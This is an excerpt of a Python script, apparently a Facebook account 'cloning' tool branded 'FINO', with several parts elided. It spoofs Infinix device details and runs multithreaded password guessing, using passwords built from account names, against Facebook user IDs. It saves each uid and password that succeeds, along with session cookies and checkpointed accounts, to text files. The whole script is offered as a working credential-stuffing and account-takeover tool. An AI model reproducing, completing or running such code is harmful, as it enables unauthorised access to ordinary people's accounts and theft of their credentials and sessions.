...
try:
	...
	os.system('python FINO.py')
os.system("clear")
print('\n\033[1;32m Loading FINO Tools...')
...
----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  FINO DAFARESTA 
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  giselle lambert
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m FINO DAFARESTA
\033[1;32m•\033[1;37m TOOLS       \033[1;32m •√\033[1;37m  FREE
\033[1;32m•\033[1;37m VERSION     \033[1;32m •√\033[1;37m  \033[1;32mERORRRR\033[1;37m 
------------------------------------------------""")
...
def Main_FINO():
		clear()
		print(f'\033[1;37m [1] FILE CLONING BY FINO \n [2] RANDOM CLONING BY FINO \n [3] GMAIL CLONING BY FINO \n [0] Exit')
		linex()
		...
		if shm =='1':
			...
			os.system('xdg-open https://www.facebook.com/Giselle Lambert')
			Main_FINO()
		elif shm =='0':
...
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	...
	with tred(max_workers=30) as FINO:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				FINO.submit(api1,ids,names,passlist)
			else:
				FINO.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[FINO]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				model,build = random.choice(infinix).split('|')
				fbmf = 'infinix'
				fbbd = 'infinix'
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[FINO-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'FINO_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'FINO_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [FINO-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'FINO-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[FINO-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [FINO-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'FINO_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
